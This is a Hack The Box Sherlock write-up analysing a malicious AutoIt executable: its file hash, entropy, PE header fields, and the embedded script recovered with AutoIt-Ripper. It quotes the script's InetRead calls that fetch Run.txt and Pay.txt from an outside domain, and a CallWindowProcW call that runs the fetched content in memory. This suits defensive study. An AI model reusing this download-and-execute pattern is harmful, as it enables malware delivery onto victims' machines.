# Malicious_AutoIT

### Scenario

The organization's Security Operations Center (SOC) detected suspicious activity involving an AutoIt script. The task is to examine the provided executable, identify its file characteristics, and analyze the embedded code.

| Field | Details |
| --- | --- |
| Platform | [Hack The Box — Sherlocks](https://app.hackthebox.com/sherlocks/Malicious_AutoIT) |
| Difficulty | Very Easy |
| Category | Malware Analysis |
| Tools | Detect It Easy (DIE), AutoIt-Ripper |
| Author | dmncdcco |

## Overview

The analysis begins with PowerShell and Detect It Easy, followed by AutoIt-Ripper to extract the script. This walkthrough follows the static evidence in the file and the recovered AutoIt code.

## Tasks

### Task 0 — Sample MD5 Hash

**Question:** What is the MD5 hash of the sample file?

- **Answer:** `5e53b40cf972f4eb08990999ce17c5c8`

- The sample's MD5 hash was calculated in PowerShell using `Get-FileHash`. The file is named `sample` and has no extension.

```powershell
Get-FileHash ".\sample" -Algorithm MD5
```

- The hash identifies the exact sample used in this investigation.

### Task 1 — File Entropy

**Question:** According to the Detect It Easy (DIE) tool, what is the entropy of the sample file?

- **Answer:** `6.58565`

- The sample was opened in Detect It Easy, and **Entropy** was selected.

![The Entropy button on Detect It Easy's main screen](https://sacitcinar.github.io/assets/writeups/malicious-autoit/entropy-button.png)

- The **Total** field gives the entropy for the entire file, rather than an individual section.

![The total file entropy reported by Detect It Easy](https://sacitcinar.github.io/assets/writeups/malicious-autoit/entropy-result.png)

- Entropy measures how random the file's contents appear. DIE flags the sample as potentially packed, but entropy alone does not establish compression, encryption, or malicious behavior.

### Task 2 — Virtual Address of the .text Section

**Question:** According to the Detect It Easy (DIE) tool, what is the virtual address of the .text section?

- **Answer:** `0x1000`

- The arrow beside **Sections** on the main screen opens the section table.

![Opening the section table from the main screen](https://sacitcinar.github.io/assets/writeups/malicious-autoit/sections-button.png)

- In the `.text` row, the **VirtualAddress** column shows `00001000`. This is the section's relative virtual address (RVA), distinct from its size and offset on disk.

![The VirtualAddress field for the .text section](https://sacitcinar.github.io/assets/writeups/malicious-autoit/text-address.png)

### Task 3 — Time Date Stamp

**Question:** According to the Detect Easy tool, what is the time date stamp?

- **Answer:** `2020-02-26 21:41:13`

- The **Time date stamp** field is visible on Detect It Easy's main screen, where the value was recorded.

![The Time date stamp field in Detect It Easy](https://sacitcinar.github.io/assets/writeups/malicious-autoit/timestamp.png)

- This timestamp comes from the PE header and can be modified, so it does not necessarily prove when the sample was created. No timezone is shown in this view.

### Task 4 — Entry Point Address

**Question:** According to Detect It Easy (DIE), what is the entry point address of the executable?

- **Answer:** `0x42800a`

- The **Entry point** field on Detect It Easy's main screen shows `0042800a`.

![The executable's entry point shown on the main screen](https://sacitcinar.github.io/assets/writeups/malicious-autoit/entry-point.png)

- This is the entry point virtual address using the image's preferred base address. It identifies where execution is intended to begin; it does not establish that the file was executed during this analysis.

### Task 5 — Domain in the Embedded Code

**Question:** What is the domain used by the malicious embedded code?

- **Answer:** `office-cleaner-commander.com`

- **AutoIt-Ripper** was used to extract the embedded script from the executable:

```powershell
autoit-ripper .\sample output
```

![AutoIt-Ripper extracts the embedded script to output/script.au3](https://sacitcinar.github.io/assets/writeups/malicious-autoit/autoit-ripper.png)

- The tool created `output/script.au3`. Inspection of the recovered AutoIt code revealed two `InetRead` calls among the randomly named variables and small functions:

```autoit
Local $FQWVYUETU = InetRead ( "http://office-cleaner-commander.com//Pay.txt" )
Local $FPWIRTAFY = InetRead ( "http://office-cleaner-commander.com/Run.txt" )
```

- Both calls retrieve content from the same domain using different paths: `//Pay.txt` and `/Run.txt`. These references identify the domain without requiring a connection to it.

### Task 6 — Hex-Encoded File Path

**Question:** What is the file path encoded in hexadecimal in the malicious code?

- **Answer:** `:\Windows\System32\`

- The extracted script contains a hexadecimal string passed to `BinaryToString`:

```autoit
Local $APWDKQXNQ = BinaryToString ( "0x3A5C57696E646F77735C53797374656D33325C" )
```

- Decoding the bytes as text reveals `:\Windows\System32\`, without a drive letter. In CyberChef, **From Hex** can decode the value after removing the `0x` prefix.

- A separate statement takes the first character of `@ProgramFilesDir`, which can provide the drive letter. However, the supplied code does not combine the two values, and the decoded path is not used elsewhere in the script.

### Task 7 — DLL Used by the Script

**Question:** What is the name of the DLL called by the malicious code?

- **Answer:** `user32.dll`

- Near the end of the script, a `DllCall` references `user32.dll` and its `CallWindowProcW` function:

```autoit
DllCall ( "user32.dll" , "int" , "CallWindowProcW" , "ptr" , DllStructGetPtr ( $NSXSMPDFO ) , "wstr" , ( $FHRAGATGG ) , "ptr" , DllStructGetPtr ( $SZMFGKHSE ) , "int" , 0 , "int" , 0 )
```

- Earlier statements transform the downloaded content with `StringReplace`, create byte structures, and populate them with `DllStructSetData`. The script then supplies the address of the structure containing the transformed `/Run.txt` content as the callback address.

- This indicates an attempt to execute downloaded code in memory. The script's own path and a pointer to the transformed `//Pay.txt` data are passed as arguments. Without those downloaded contents or runtime evidence, the next stage's behavior and execution success remain unknown.

## Findings and Indicators

The sample contains an embedded AutoIt script that retrieves data from two URLs, replaces marker strings in the downloaded content, and copies the resulting data into memory structures. It then uses `CallWindowProcW` from `user32.dll` to invoke one of those memory addresses.

This points to an attempt to execute downloaded code in memory. The downloaded files were not available for inspection, so their contents and subsequent behavior remain unknown.

| Indicator | Value |
| --- | --- |
| Sample MD5 | `5e53b40cf972f4eb08990999ce17c5c8` |
| Domain | `office-cleaner-commander[.]com` |
| Download paths | `//Pay.txt`, `/Run.txt` |
| Hex-decoded path | `:\Windows\System32\` |
| DLL / Function | `user32.dll` / `CallWindowProcW` |

The decoded System32 path is present in the script but is not used by the supplied code. Its presence alone does not show that any file was written there.

---

*This write-up is intended for educational purposes and authorized security research.*
